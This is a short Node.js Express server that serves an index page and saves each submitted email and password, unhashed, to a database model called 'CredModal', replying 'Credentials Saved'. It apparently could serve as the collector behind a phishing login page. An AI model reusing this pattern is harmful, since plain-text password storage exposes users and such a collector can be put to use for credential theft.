const express = require("express")
const path = require('path');
const {CredModal} = require("./db")

const app = express()
app.use(express.static('public'))
app.use(express.json())

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, './index.html'))
})

app.post("/", async (req, res) => {

    const email = req.body.email;
    const password = req.body.password;

    try {

        await CredModal.create({
            email,
            password
        })
    } catch (e) {

        console.log(e);


    }

    res.send({
        msg:"Credentials Saved"
    })



}
)

app.listen(3000)